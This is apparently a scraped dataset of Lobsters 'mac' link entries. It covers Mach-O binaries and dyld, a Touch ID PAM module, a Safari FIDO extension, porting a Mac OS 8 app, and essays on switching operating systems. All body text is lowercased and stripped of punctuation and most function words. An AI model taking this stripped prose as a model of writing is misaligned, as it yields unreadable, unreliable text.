dyld allows lazily linking dynamically linked code const example constant similarly cstring contains literal string constant executable quoted string source code data segment contains readwrite data case nlsymbolptr lasymbolptr nonlazy lazy symbol pointer respectively lazy symbol pointer used socalled undefined function called executable ie function within executable lazily resolved nonlazy symbol pointer resolved executable loaded common section data segment const contain constant data need relocation example char const p foo data pointed p constant bs section contains uninitialized static variable static int ansi c standard specifies static variable must set zero changed run time common section contains uninitialized external globals similar static variable example would int outside function block finally dyld placeholder section used dynamic linker apple o x assembler reference information section type section content inspect content section otool like xcrun otool text text aout aout text text section ec fc ec code app since text text common otool shortcut argument even look disassembled code adding v xcrun otool v aout aout text text section main pushq rbp movq rsp rbp subq rsp leaq rip rax movl rbp movl edi rbp movq rsi rbp movq rax rdi movb al callq movl ecx movl eax rbp movl ecx eax addq rsp popq rbp ret stuff time disassembled look familiar looked bit back compiling code difference assembler directive code anymore bare binary executable similar fashion look section xcrun otool v text cstring aout aout content text cstring section hello world n xcrun otool v text ehframe aout aout content text ehframe section side note performance side note data text segment performance implication large binary might want check apple documentation code size performance guideline moving data text segment beneficial page never dirty arbitrary section add arbitrary data section executable sectcreate linker flag add infoplist single file executable infoplist data need go infoplist section text segment pas sectcreate segname sectname file linker passing wl sectcreate text infoplist pathtoinfoplist clang similarly sectalign specifies alignment adding entirely new segment check segprot specify protection readwriteexecutable segment documented main page linker ie ld get section using function defined usrincludemachogetsecth namely getsectdata give pointer section data return length reference macho executables o x io macho executables file aout aout macho executable true gui application file applicationspreviewappcontentsmacospreview applicationspreviewappcontentsmacospreview macho executable apple detailed information macho file format use otool peek executable mach header specifies file loaded use h flag print header information otool v h aout aout mach header magic cputype cpusubtype cap filetype ncmds sizeofcmds flag execute noundefs dyldlink twolevel pie cputype cpusubtype specify target architecture executable run ncmds sizeofcmds load command look l argument otool v l aout open f aout load command cmd cmdsize segname pagezero vmaddr vmsize load command specify logical structure file layout virtual memory information otool print derived load command looking load command part find initprot rx specifies protection mentioned readonly nowrite executable segment section within segment load command specifies memory end protection etc output text text section section sectname text segname text addr size offset align reloff nreloc type sregular attribute pureinstructions someinstructions code end memory offset file look disassembly output xcrun otool v aout see code fact also take look dynamic library executable using otool v l aout aout usrliblibsystembdylib compatibility version current version time stamp thu jan executable find printf symbol using complex sample let look slightly complex sample three file fooh import foundationfoundationh interface foo nsobject void run end foom import fooh implementation foo void run nslog nsfullusername end helloworldm import fooh int main int argc char argv autoreleasepool foo foo foo alloc init foo run return compiling multiple file sample one file therefore need tell clang first generate object file input file xcrun clang c foom xcrun clang c helloworldm never compiling header file purpose simply share code implementation file get compiled foom helloworldm pull content fooh import statement end two object file file helloworldo fooo helloworldo macho object fooo macho object order generate executable need link two object file foundation framework xcrun clang helloworldo fooo wl xcrun showsdkpath systemlibraryframeworksfoundationframeworkfoundation run code aout aout daniel eggert symbol linking small app put together two object file fooo object file contains implementation foo class helloworldo object file contains main function callsuses foo class furthermore use foundation framework helloworldo object file us autorelease pool indirectly us objectivec runtime form libobjcdylib need runtime function make message call similar fooo object file represented socalled symbol think symbol something pointer app running although nature slightly different function global variable class etc defined used result symbol link object file executable linker ld resolve symbol needed object file dynamic library executables object file symbol table specify symbol take look helloworldo object file nm tool get xcrun nm nm helloworldo undefined external objcclass foo text text external main undefined external objcautoreleasepoolpop undefined external objcautoreleasepoolpush undefined external objcmsgsend undefined external objcmsgsendfixup text objcmethname nonexternal lobjcmethvarname text objcmethname nonexternal text objcmethname nonexternal data objcmsgrefs weak private external lobjcmsgsendfixupalloc text ehframe nonexternal text ehframe external maineh symbol file objcclass foo symbol foo objectivec class undefined external symbol foo class external mean private object file opposed nonexternal symbol private particular object file helloworldo object file reference class foo implement hence symbol table end entry marked undefined next main symbol main function also external need visible order get called however implemented helloworldo well resides address need go text text section four objectivec runtime function also undefined need resolved linker turn toward fooo object file get output xcrun nm nm fooo text text nonexternal foo run undefined external nsfullusername undefined external nslog undefined external objcclass nsobject undefined external objcmetaclass nsobject undefined external cfconstantstringclassreference undefined external objcemptycache undefined external objcemptyvtable text cstring nonexternal lstr text objcclassname nonexternal lobjcclassname data objcconst nonexternal lobjcmetaclassro foo data objcconst nonexternal lobjc instancemethodsfoo data objcconst nonexternal lobjcclassro foo data objcdata external objcmetaclass foo data objcdata external objcclass foo text objcmethname nonexternal lobjcmethvarname text objcmethtype nonexternal lobjcmethvartype text ehframe nonexternal text ehframe nonexternal foo run eh fifthtolast line show objcclass foo defined external fooo class implementation fooo also undefined symbol first foremost symbol nsfullusername nslog nsobject using link two object file foundation framework dynamic library linker try resolve undefined symbol resolve objcclass foo way others need use foundation framework linker resolve symbol dynamic library case foundation framework record inside final linked image symbol resolved dynamic library linker record output file depends particular dynamic library path happens nsfullusername nslog objcclass nsobject objcautoreleasepoolpop etc symbol case look symbol table final executable aout see linker resolved symbol xcrun nm nm aout undefined external nsfullusername foundation undefined external nslog foundation undefined external objcclass nsobject corefoundation undefined external objcmetaclass nsobject corefoundation undefined external cfconstantstringclassreference corefoundation undefined external objcemptycache libobjc undefined external objcemptyvtable libobjc undefined external objcautoreleasepoolpop libobjc undefined external objcautoreleasepoolpush libobjc undefined external objcmsgsend libobjc undefined external objcmsgsendfixup libobjc undefined external dyldstubbinder libsystem text text referenced dynamically external mhexecuteheader text text external main text text nonexternal foo run data objcdata external objcmetaclass foo data objcdata external objcclass foo see foundation objectivec runtime symbol still undefined symbol table information resolve ie dynamic library found executable also know find library xcrun otool l aout aout systemlibraryframeworksfoundationframeworkversionscfoundation compatibility version current version usrliblibsystembdylib compatibility version current version systemlibraryframeworkscorefoundationframeworkversionsacorefoundation compatibility version current version usrliblibobjcadylib compatibility version current version undefined symbol resolved dynamic linker dyld runtime run executable dyld make sure nsfullusername etc point implementation inside foundation etc run nm foundation check symbol fact defined xcrun nm nm xcrun showsdkpath systemlibraryframeworksfoundationframeworkfoundation grep nsfullusername text text external nsfullusername dynamic link editor environment variable useful see dyld first foremost dyldprintlibraries set dyld print library loaded export dyldprintlibraries aout dyld loaded usersdeggertdesktopcommandlineaout dyld loaded systemlibraryframeworksfoundationframeworkversionscfoundation dyld loaded usrliblibsystembdylib dyld loaded systemlibraryframeworkscorefoundationframeworkversionsacorefoundation dyld loaded usrliblibobjcadylib dyld loaded usrliblibautodylib show seventy dynamic library get loaded part loading foundation foundation depends dynamic library turn depend others forth run xcrun otool l xcrun showsdkpath systemlibraryframeworksfoundationframeworkfoundation see list fifteen dynamic library foundation us dyld shared cache building realworld application linking various framework turn use countless framework dynamic library list dynamic library need get loaded get large quickly list interdependent symbol even thousand symbol resolve work take long time several second order shortcut process dynamic linker o x io us shared cache life inside vardbdyld architecture o single file contains almost dynamic library already linked together single file interdependent symbol resolved macho file executable library loaded dynamic linker first check inside shared cache image use shared cache process dyld shared cache mapped address space already method dramatically improves launch time o x io
466,Lobsters,mac,Apple macOS,hamzasood/pam_touchid: A PAM module for authentication with Touch ID.,https://github.com/hamzasood/pam_touchid,hamzasoodpamtouchid pam module authentication touch id,installation configuring sudo use get locked sudo,pam module authentication touch id module take optional parameter reason value shown dialog presented user argument omitted generic text used warning procede unless sure sure turn back installation build project copy usrlocallibpam set permission owner root group wheel configuring sudo use open upetcpamdsudo favourite text editor add auth sufficient pamtouchidso reason execute command another user top file procedure pretty much process edit different config file probably change reason get locked sudo feel bad lied sure enable root user system preference use su put config file back
467,Lobsters,mac,Apple macOS,Safari-FIDO-U2F: native Safari extension to enable universal second factor authentication,https://github.com/blahgeek/Safari-FIDO-U2F,native safari extension enable universal second factor authentication,safari fido fido support safari quick start latest release supported site problem changing safari useragent chrome technical detail safari app extension fido javascript api specification problem build xcode dependency testing continuous integration travis still issue disclaimer tell u site nt work,safari fido fido support safari quick start use extension download latest release run quit safari open click open safari preference enable safari fido extension extension requires macos later macos safari supported site fido specification defines highlevel javascript api leaf browser implement also leaf individual site work api present supported extension work injecting support highlevel fido javascript api current page many site notice present work following tested problem two main reason site working extension work injecting code page load site perform check early injected code present note version plugin injects code quite early seems fixed issue site assume chrome support mac wo nt even try use detect safari workaround changing safari useragent chrome may make site function unfortunately incompatibility chrome safari often cause problem since site attempt use unrelated chromeonly feature really way fix site talk developer ask use another way determine whether enable support checking nonnull enough technical detail extension us safari app extension api introduced safari allows safari extension built using native code embedded another app native part written swift us actually talk hardware small bridgejs script injected top level page automatically extension performs three task listen beforeload use inject another script document listen message posted pass native code listen message sent back native code pas back processing script implement highlevel javascript api described fido javascript api specification setting object provides implementation api api variant register sign supported page already set attempt merge implementation rather completely replacing get first try lock property script ca nt replace different object still set custom property though also provide nonstandard function used detect whether particular implementation present highlevel implementation convert supplied parameter dictionary sends processing native code native code effectively implement lowlevel api also described specification theory site free talk directly native code posting message using lowlevel api highlevel api asynchronous return result via callback requestid parameter used track request sent extension reply come back extension requestid used associate reply correct callback called mentioned problem fact wait script load theory cause timing problem page code decides whether enable support based whether present possible run early inject listening beforeload event seems get sent early enough domcontentloaded page work build xcode clone project open xcode workspace select scheme application extension must code signed build locally need adjust development team setting project team mac developer certificate choose run product menu xcode build launch small app enable extension within safari dependency plugin make use following sake simplicity compiled binary three committed repo source three available github repos wish build library locally instead using homebrew brew install hidapi jsonc testing two set unit test swift test run choosing test product menu primarily test code format incoming request dictionary javascript side par outgoing response hardware side nt currently test hardware therefore test run without hardware present javascript test use jest install dependency command line npm install test run npm test continuous integration ci set using travis committing branch making pull request repository trigger build test fork repo probably need tweak travisyml want run test instance still thing still see issue detail find site nt work feature missing feel free make issue report urge contribute would welcome code follow consistent standard yet slowly cleaning mean hack code make pull request might best check plan first making issue discussing disclaimer author extension security cryptography javascript expert extension still experimental use entirely risk feedback contribution welcomed particular please tell u site nt work please also consider contacting owner site make aware extension work together fix problem
468,Lobsters,mac,Apple macOS,The Graphing Calculator Story,https://www.youtube.com/watch?v=Dl643JFJWig,graphing calculator story,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature graphing calculator story youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature graphing calculator story youtube
469,Lobsters,mac,Apple macOS,Compiling a Mac OS 8 application on macOS Sierra,https://www.cocoawithlove.com/blog/porting-from-macos8-to-sierra.html,compiling mac o application macos sierra,doomed development environment programming operating system codewarrior pro introduction application framework powerplant powerplant framework project xcode series mac o x lion carbon version mine resource fork alive quick code analysis handle handle independent review conclusion update macos article update edition download mine github account readme file,armed brand new copy metrowerks codewarrior powermac running mac o wrote basic implementation minesweeper test powerplant application development environment oldest project mine kept wanted see could get running first time year swift objectivec code article diskeating koala deliberately misspelled city zernike polynomial cocoa software cocoa thinking resource fork master pointer block end finally earn admiration family content internet came australia late reached home town aarnet connected university melbourne australian national university noticed time country year working famous movie star something else know long time ago however first read internet clifford stoll book cuckoo egg around year later finally shown friend older brother could gain illicit access internet computer walked one library university campus sat computer login required dozen different cover design book mine looked like library computer fetch diskeating koala ftp client delivered low quality shareware mirrored university michigan sithqx format newswatcher usenet client flame war uuencoded part macgopher rodent family geomyidae delivered menu containing menu containing menu containing actually never made far oddball new program called mosaic program written andreessen center supercomputing champagne specialized drawing gray background behind construction logo fetch newswatcher macgopher mosaic thusly blessed early access world wide web choice start career part time web developer still high school first plain html perl phpfi two step forward one step back never really enjoyed web development helped pay way university little left buy powermac apple countless different computer shared name powermac version bought charcoal black builtin tv tuner making even cooler quadra lusted couple year earlier although shared similarly ridiculous geoport modem powermac director edition tv tuner doomed development environment initially still programming powermac using old copy think c using since think c icon system icon blackandwhite realize starfield earlier version named lightspeed c made absolutely sense time think c learned c c whatever passed c know code went away eaten grue gone think c woefully outdated symantec norton utility merged ruined going full antivirus needed something else apple development offering time mpw macintosh programmer workshop according primary environment developing serious mac program never really used free time barely glorified make script command prompt using think c many year idea programming without proper ide seemed like serious regression principle still maintain briefly dual booted beos powermac used c development environment came simple effective beide c development environment developed either nextstep time retrospect beos apis like weird mashing together nextstep mfc classic mac o unix idea main application apis named application kit like nextstep appkit b prefix instead n prefix core event loop resembled window message handling application built number rsrc resource like mac o linked executable whole thing ran vaguely posix environment access bash shell beide taken programming operating system time beos amazing cold boot desktop second unbelievable apple passed beos something called next right decision retrospect although disagreed time rat already leaving ship operating system survive without user know beos code went assume like beos code survive transition mac o x using beos noted release metrowerks codewarrior platform claimed powerful ide default beide never tried beos metrowerks released update mac codewarrior pro gave go codewarrior feature never seen graphical class browser uptodate c compiler excellent layout editor constructor ide integrated resource manager ppedit wide set resource editing tool user interface sense style use color gray although obviously still plenty gray codewarrior project window taken codewarrior pro introduction least year loved codewarrior still fondly remember box yellow black construction theming blood sweat code tagline huge leap forward represented development tool mac motorola acquired metrowerks completely fumbled mac o x transition also powerpc iridium network rokr phone everything else since mac programmer largely moved apple project builder still miss codewarrior ide aspect userinterface better major ide since codewarrior cd came custom plastic cardboard case application framework bit strange think time library bundled operating system really include standard application framework apps needed include clear talking library like appkituikit perform basic application lifecycle stage coordinate document creation persistence handle main event loop handle event dispatch offer library reusable view control earlier thing part operating system every application handle bundle framework could first framework mac platform macapp object pascal framework originally developed larry tesler course larry tesler long history software including long stint xerox parc alan kay also worked stagecast creator kid friendly application development environment originally called cocoa apple larry left apple took development environment minus name apple reused name cocoa project stagecast creator development environment formerly known cocoa first effort programming mac c involved typing application framework named skeleton book long forgotten numerous framework time used skeleton name hard work book actually read whole process complicated fact never seen c encountered compiler issue tended add sigils parameter arbitrarily cast pointer compiler shut left wonder caused erratic crashprone result memory protection say crash mean needed reboot whole computer painful learning process c use asterisk declaration eg sometype somepointer define pointer asterisk elsewhere eg somepointer dereference pointer remains one newcomer hostile syntax decision ever encountered language gone object pascal pointer syntax even look like smiley skeleton enough write first application one stick memory version minesweeper line single mainc file contained resource asset since really understand thing drew artwork pixel pixel c code long gone assume flawless clearly learned everything know c moved onto c think c environment using included think class library tcl spent time learning c learning tcl remember reading tcl manual chapter remain mind talked object oriented programming though solved problem immediately segued infamous diamond inheritance problem discussion car also plane thing never change find image actual think c manual used redwhiteandblack styling disk multiple tome heavy enough crush elephant thing delivered box doubled miniature bookshelf still dwarfed apple least volume inside macintosh series armed c tcl halffinished numerous program flawless last year system drew close time start fresh time powerplant application framework bundled codewarrior kept codewarriorpowerplant project kept maybe one day try get engineering final year project working enticingly named image analysis using zernike moment best rotionally invariant orthogonal polynomial image recognition mac app year time might right bring back yet time zernike moment instead want look first program wrote powerplant reimagining earlier flawless masterpiece minesweeper implementation hoping year since earlier minesweeper implementation learned basic pointer syntax powerplant need get powerplant building try build powerplantbased app fortunately powerplant ended open source freescale motorola spinoff took codewarrior open sourced powerplant bsdstyle license powerplant framework project largely abandoned exists worked first mac o x version mac o x version powerplant requires mac o x sdk earlier build build sdk certainly sdk last version xcode include sdk xcode series mac o x lion run sierra open bundle copy folder place location xcode bundle enough get sdk work also need edit minimumsdkversion xcodeappcontentsdeveloperplatformsmacosxplatforminfoplist file xcode bundle okay xcode set create project file idea file powerplant need optional extra threw everything single xcode target set build intel build sdk added sdkroot developerheadersflatcarbon header search path set always search user path compile source c arbitrarily chose one prefix header set c dialect standard library libstdc hit build see would happen oh hi opentransport remember thing going oh sad stopped existing mac o x fine everything networking get removed build apparently trying build old library named morefiles even though version still appear exist github optional disable debugging function causing problem go dozen switch statement appear variable defined within case label bothering clang need wrap scope gestalt driving crazy telling return correct o version past mac o strip hardcode result fool dozen little change later everything appears work carbon version mine mine application around line code split across class small tiny end program size scale however unlike powerplant updated mac o x tried run compile mine application since mac o back never ported apps classic mac o mac o x know smooth turn morethanoneline code change needed make replace standardgetfile standard open file dialog classic mac o function part carbon need replaced navgetfile dutifully made line change subsequently realize code used application save file opening file nothing minor compatibility change made getdatetime cfabsolutetimegetcurrent rgnbbox getregionbounds whole everything appears compile without serious drama resource fork course upon running program immediately aborted trying find required resource classic mac o resource anything particularly strange really way serializing number binary blob single file resource uniquely identified type code index resedit probably widely used development tool classic mac o era none represents problem represent problem resource stored separate resource fork file way made sense blob often metadata data stored data fork nice idea rich structured metadata storing metadata outside data fork problematic world file moved operating system file system interoperate via single data fork metadata either get lost end series annoying hidden file short rich metadata purgeable like spotlight metadata regenerated contextually main data next time spotlight see file nonpurgeable metadata main data fork accordingly resource fork always deprecated mac o x read effort rather needing effort far better move old resource fork minesrsrc standard resource minesppob powerplantspecific resource data fork single file new data fork resource file named minesrsrc basename executable placed application bundle resource folder data fork automatically read call getresource shortest way run derez two resource fork eg derez minesrsrc minesr derez minesppob concatenate two file use rez build back single data fork rez minesr usedf minesrsrc small note concatenation file may produced classic mac cr line ending file also contains unix lf line ending rez silently ignore everything point spent minute wondering none resource ppob file found unix lf crept class mac cr line ending file alive let realistic minesweeper implemention resource fixed application run click new game leftclick tile reveal shiftclick mark possible mine singlebutton mouse time continue clearing every nonmine revealed use game option game menu change number mine size field whether timelimit whether game auto started remain plenty quirk leave asis mine item mine menu work item menu nothing including two quit mine entry probably created powerplant quit app use quit bottom file menu quick code analysis worst code likely see tidy coherent even demonstrates apparent ignorance larger scale design pattern obvious problem square minefield represented simple short adjacent mine count cleared status flagged status packed short using bitmasks technical level work fine except packing unpacking data short work left cmineswindow requiring methodical menial work every location minefield accessed clearly would better tile c class method return isflag numadjacentmines packing unpacking data abstracted away internal technical detail perhaps proper bitfields would make cmineswindow code easier read would likely significant linesofcode saving add one proximity count surrounding square randnum mfieldwidth randnummfieldwidth mminefield keightmines mminefield mminefield keightmines mminefield randnummfieldwidth mminefield keightmines mminefield code really abstracted away behind dedicated tile minefield interface lead idea mine field single minefield data type know determine adjacent tile know bound know populate know propagate revealed zero tile need consider fact state game time remaining mine remaining mine field part game data type know start game based set initial difficulty setting serialize user instruction stream reveal tile protect tile game easy serialize save restore pause neither possible existing game finally lead question whether modelviewcontroller separation code clearly separate model view controller class still possible identify data member method correspond even though part cmineswindow interface instance variable cmineswindow defines really model data everything viewrelated purely inherited cwindow cminesview controller code occurs cwindow lperiodical llistener method override propagate change view outside environment model constructor cmineswindow cmineswindow lstream instream lwindow instream initialise variable mfieldheight mfieldwidth mnumcoveredsquares mfieldheight mfieldwidth mnummines mgamelength mingame false mautostart false muntimed false place decorative minefield window start mminefield short newptr sizeof short throwifmemfail mminefield clear minefield short mfieldwidth mfieldheight mminefield kzeromines exactly code expect find window constructor ignoring superconstructor method purely concerned model given perfectly valid criticism surprising tidy organized code guess abstraction really matter much code small handle general looking mac o era code strange expected maybe still accustomed reading c c daily life different code still actively maintain today c function taking multiple carefully allocated configured struct parameter returning error code ugly still ugly find plenty modern corefoundation function work way really jump code another world handle remember memory layout preos x era mac o fixed application given specific memory size launch stack top heap bottom two raced towards frequently colliding outofmemory stack overflow situation could get info application give memory next launch launched application easily get memory figure stack macintosh memory management inside macintosh volume one biggest problem arrangement memory fragmentation allocating deallocating heap memory pattern leaf unusable hole heap memory fragmentation still exists partially mediated memory paging better allocator usually ignore excess memory usage big issue gb ram era computer might le ram memory fragmentation serious problem address mac o used handle different window handle memory resource owned operating system behalf instead mac o handle pointer pointer dereference handle get master pointer lived special master pointer block ideally bottom heap dereference master pointer finally get actual block advantage approach master pointer block fixed location actual block relocatable could moved memory manager resolve heap fragmentation figure handle relocatable block macintosh memory management inside macintosh volume time wanted access handle data dereference level could find possibly moved location needed use function could move memory needed careful call hlock hold handle place otherwise every pointer handle content would invalid needle say caused memory corruption regular basis failing consider heap compaction around pointer good time figure heap compaction macintosh memory management inside macintosh volume also needed guess many handle would needed program allocate correct number master pointer block program startup master pointer block could added time since master pointer block fixed location allocation would fragment memory appeared middle heap course none ever applied mac o x hlock movehhi moremasterpointers related handle function always noops mac o x handle nonrelocatable like normal pointer allocation relying paging better heap allocator mediate fragmentation entire concept relocatable memory block trying plan peak memory usage program started seems surreal independent review got mine running sitting computer screen mission accomplished go cook dinner return one child sitting computer playing game apparently wife given instruction play child continued playing another half dozen game wife left help dinner sure child ever much looked one computer program written much le played minute opinion good take conclusion update macos code article longer compiles due deprecation macos see article update edition information download mine github account code two different open source license due inclusion powerplant remember still need obtain copy mac o x sdk modify mac o x platform infoplist file get error missing sdk try build consult readme file detail really expect get mine running end surprisingly simple mean took nearly hour get powerplant building omitted wrong turn involved brevity also spent couple hour trying get powerplant constructor application read old ppob resource cover eventually worked replacing fspopenresfile fsopenresourcefile forcing loading ctyp resource file riddled issue parsing layout color want actually maintain userinterface way updating mine application code powerplant mac o change required le minute ignoring time wasted due line encoding issue r rez file game simple full quirk design issue gameplay problem try setting board size largest mine game basically solves obviously quality game wanted see could
470,Lobsters,mac,Apple macOS,Why I switched from OS X to Linux,https://jeena.net/why-i-switchedfrom-osx-to-linux,switched o x linux,history christian networkmanager wpasupplicant systemd irc channel webpage mac year infogate mathias love affair o x textmate cocoamysql texted thinkpad time goetz buerkle assignment replaced repairing fan fixing overheating sound card listening music second love affair linux pelagicore intellectual property policy jeremiah arch linux yocto use blog switch,writing macos switched new name came along let start beginning history first computer amiga got school cool people amigas ataris weird people pc microsoft o gaming also read amigabasic programming book back back quite many time source information programming back book looked awfull binding really bad end couple hundred page loosly held together plastic bag puberty came along abondened computer compleatly moped car went techno club organized underground party literally started playing bass two band need computer meantime internet happened therefor became decided also needed computer get internet email address people could write email bought used fujitsu simensnixdorf pc came without operating system back pc magazine could buy came cd cd bought right magazine linux distribution one got mandrake think french distribution also bought modem installed mandrake worked ok bit different amiga o obviously also shell colorfull came program preinstalled sadly love god nt able get modem anything guess nt driver model without internet nt possible research oh really bad english nt make thing easier really bad feeling installed microsoft o think window modem worked hard drive small nt able dualboot took year position install linux girl also computer could use research installation got adsl thus got ethernet worked used debian netinstall diskette bootstrap system first love affair linux lasted three year moved gentoo also got new used computer christian build part computer home time really happy brought train dortmund germany varberg sweden quite ride although gentoo helped learn lot system also pain as problem biggest wifi back networkmanager nt get set wpasupplicant boot yeah systemd either nt even able automatically start x computer booted mess time irc channel actually still since hanging people getting powerbooks macbooks magic around even webpage described got apple computer always updated within hour someone bought new one wanted one poor machine expensive worked paperboy night went swedish math school day quite good frontend webdevelopement knew lot semantic html great deal cs browser quirk fix looking job got one gig translate image file medium company photoshop htmlcss template would use cm got around eur chanse wanted macbook computer bad would awesome good working computer still nt enough money christian offered buy possibility get discount something nt quite remember brought spent vaccations visiting even recorded unboxing check video mac year really happy bought also gave confidence would able work frontend web developer manage one gig even send money could buy something would nt able paperboy work payed really shitty new found confidence got real job infogate halmstad away varberg train connection could commute every day infogate asked computer like one guy nt window dell mathias later worked company odelay anyway macbook design guy thought one already somehow got everything working wo nt complicated therefor told like macbook used work love affair o x awesome textmate desktop manager cocoamysql lightroom photoshop itunes basically used listen music xcode used work iphone o apps one first people sweden professionally odelay obviously got new macbooks imacs new iphones every year etc full whole eco system year started seeing crack first small introduced space desktop manager nt working anymore thus nt able change speed would change virtual desktop central peace workflow introduced icloud texteditor instead starting could instantly write used often take note create file first every time one extra step hated hated much rewrote texteditor would work like plain text texted itunes started getting controll fish meat plane everything got worse worse time wanted computer work certain way often worked way came o x update made impossible keep workflow thinkpad time stopped working odelay gave back macbook bought imac needed laptop university goetz buerkle always macbook thinkpad telling good thing thinkpad work machine asked around people told great linux support student without job nt really money buy used macbook anyway thought would give linux chance especially university almost computer running red hat linux would nt problem assignment stuff therefor bought used thinkpad machine replaced half year ago like tank robust hell made possible would dreamt macbook year something broke able repair repairing fan fixing overheating sound card etc oh nt imac anymore either used desktop computer home wanted bigger screen example lightroom dealing picture listening music nt got robbed took together nikon podcasting equipment much upset took camera imac kind meh whatever nt use much anyway inconvinient second love affair linux done study university wanted work company worked open source started pelagicore still work creating custom linux distribution car manufacturer ui work write linux driver linux middleware work linux much convinient run linux nativelly developement pelagicore almosc developer work linux desktop laptop felt fit right thinkpad also used imac le le everybody around using linux became cumbersome overhead get stuff running imac already running work laptop linux started ubuntu quite fast switched debian testing gnome learned canonical treat everyone user amazon problem http wwwzdnetcomarticleshuttleworthdefendsubuntulinuxintegratingamazon unity dash search result problem intellectual property policy etc also helped jeremiah evangalizes debian day day work wanted try arch linux installed thinkpad man performance boost felt like new machine comperison ubuntu nowadays run arch work stuff nt work like specific version yocto wrap docker container ubuntu image compatibility use mostly using free software o x already like firefox libreoffice emacs still took work find would work every use case working o x therefor list used back use usecase o x linux comment listening music itunes gnome music simmular ui album cutting picture photoshop gimp super nice really basically cut picture text editor textmate sublime text emacs learning curve steep much powerfull editing raw picture lightroom darktable opinion ui nt slick much powerfull blog explain implemented thing super awesome audio processing ableton live ardour really awesome whole jack v pulseaudio writing iso usb stick dd gnome disk ui much safer love irc chat textual hexchat much stable email mailapp thunderbird one nice nt found anything better calendar ical gnome calendar getting better still lack day week view really bad address book address book gnome contact sadly really really shitty terminal terminator better feature use every day reading r feed reeder feedthemonkey one wrote actually wrote partially imac cross o compatible qt tweeting twitter mac website basically stopped using twitter looking replacement password manager x nt use letting computer read article speaker typetalk o x app wrote linux found typetalk nt quite work wanted worked developer implemented feature request ardour gnome calendar gnome contact darktable disk emacs hexchat keepassx gnome music termitator typetalk switch think started dissatisfaction o x disire least theory able change thing would work like want translates directly gpl license program use use add feeling membership everyone work using linux also pride curiousity able sometimes look behind scene direcly code everything possible o x top fact use linux many different hardware laptop desktop work security cam running poland raspberry pi embeded device car selfdriving car anyone phone router together right compelling macos nt stand chance
471,Lobsters,mac,Apple macOS,From OSX to Ubuntu,https://nicolas.perriault.net/code/2016/from-osx-to-ubuntu/,osx ubuntu,click redirected,click redirected
472,Lobsters,mac,Apple macOS,Apple Sandbox Guide v1.0 (2011),https://reverse.put.as/2011/09/14/apple-sandbox-guide-v1-0/,apple sandbox guide,sbpl appendix b idc enterprise mac security mac o x snow leopard apple sandbox guide viennasbgz,version consider good enough come draft status added information one thing especially interested match available operation sbpl syntax systemkernel function control help better understand impact operation appendix b feature lazy idc script used extract information sandbox kernel module match xnu kernel source tried provide example operation make note problemsfeatures available also added reference subject book enterprise mac security mac o x snow leopard pretty good chapter dedicated hope useful using reference developing custom profile enjoy fg apple sandbox guide apple sandbox guide viennasbgz viennasb
473,Lobsters,mac,Apple macOS,Giving Windows a Chance,https://medium.com/@searls/giving-windows-a-chance-39f4d7f1b93c,giving window chance,giving window chance attempt use window seriously mac window comeback apple unveiled macbook pro intentional read old mac user microsoft finally taste,giving window chancewhy attempt use window seriouslyi bought surface pro tonight next week going share note getting used next month going attempt open source work tonight want first comment state mac pc get initial perspective bias tablesubsequent post series include thisi maclike many open source developer used do window throughout toyed failed successfully adopt desktop linux ultimately switching mac o x bought first mac ibook summer never looked back well tonight guesssomething look feel o x always able deceive brain believing interacting real window knob slider opposed consciously clicking crude geometric shape whenever found using window daily work next five six year stark reminder even one point friction could dispel illusion computer graphical interface represented real object sort friction could found everywhere window choppy frame rate lack transition animation inconsistent shading jarringlyinstantaneous scrolling unnatural mouse cursor acceleration secondslong click delayswhenever encountered friction sucked immediately productive flow subsequently sidetracked rabbit hole obsessive customization configuration attempt ameliorate issuethe window comeback old window got better refrain hearing satya nadela masterful turnaround mess ballmer made start yield fruit friend mine work microsoft open source building support language verboten among microsoft faithful year ago microsoft focus service platform dominance given flexibility perhaps even imperative embrace outside software community earned tremendous goodwill among many software developersbut enough goodwill convince developer start working window depends part two thing degree developer mastery unix extent microsoft succeeds integrating linux subsystem broader window experienceif mac convincing coherent graphical interface drew developer fly honey certified unix underpinnings served venus flytrap year ago could consider moving back window yet understand appreciate powerful unix toolchain facilitating software development window operating system using application unix operating system writing would say mac o x emerged superb contender front simultaneously cutting inroad desktop linux making delighting user capture virtually industry profit hardware salesit may seem counterintuitive microsoft throwing towel decadesold strategy platform dominance would suddenly increase interest adoption said platform aforementioned goodwill palpable lot developer apparently frustrated apple tight control ecosystem eyeing progress bash window logical jumpingon point give window apple unveiled macbook prothe apple keynote unveiled new macbook pro clarifying event reminded many today developer got board apple reason used window throughout dominance made default choice whatever developer reason using mac might longer assured first bought apple design philosophythe backlash following unveiling bewildering apple faithful bloggerati new macbooks better every way predecessor thought would people threaten jump ship perhaps shipjumpers previously realize ship heading developer using mac today ever owned one model provided second data point draw line thereby revealing difference apple priority extrapolated forwardsuddenly new generation mac user outraged apple factoring weight size trade offs driving design portable computer thousand tweetstorms born assumption word pro implied maximum theoretical computing power cost oh speaking cost expensive pro afford well laptop future maximum ram indicated yet simultaneously insufficiently reverent past sporting usbc portsthis garbled confused countermessaging came courtesy diverse group user got board mac mostly default mainstream choice result represented messy discordant cacophony viewpoint come surprise fact remind u dilemma microsoft faced early window xp hegemony peaked nowhere left go price microsoft paid form extreme configurability corporate control sapped platform freedom strategic much le tasteful movement apple may achieved market monopoly microsoft effectively backed corner thoroughly dominating market people willing pay premium computer enjoy intentional read old mac usersthe circumstance switched mac different apple scrappy underdog nearly every measure decided dive headfirst ecosystem realizing much le friction would encounter simply relied exclusively apple device service even muchderided stock apps right use reminder mail calendar save ton time others bristle apple assertion control find constraint place liberating used buy device thrill exploring way could configure slowly became aware paradox choice surrounded realizing paying ongoing customization tax enough severely diminish productivity working within thoughtfully constrained system even required acquiesce someone else opinion helped focus mental energy problem actually trying solvethis humbling multiyear transformation went see foolish assume mac user gone wellto illustrate effect mindsetshift consider hardware design many developer mock apple love thinness come expense maxing device technical specification always found apple hardware design calmingly consistent imagine apple hardware design start platonic form residing primarily mind jony ive suppose form ideal macbook thin piece continuous aluminum happens crease halfway pointhas battery last day end charge wirelesslyhas trackpad keyboard despite impossibly thin give one finger tip sensation luxurious clicky travelhas processor fast enough memory ample enough spinning beachball animation safely deleted operating system io never needed one display reproduces image clearly looking windowweighs enough avoid floating desk escaping earth gravityi suspect apple start perfect unattainable design mind everything come next painful trade unavoidable affordance deemed necessary ship product every mac reflection technical constraint day never crudely wholly defined apple famous marketing best vault product back platonic heaven starting product photo backed pristine white background average person living earth reasonably evaluates final physical product compromised expect every component feature 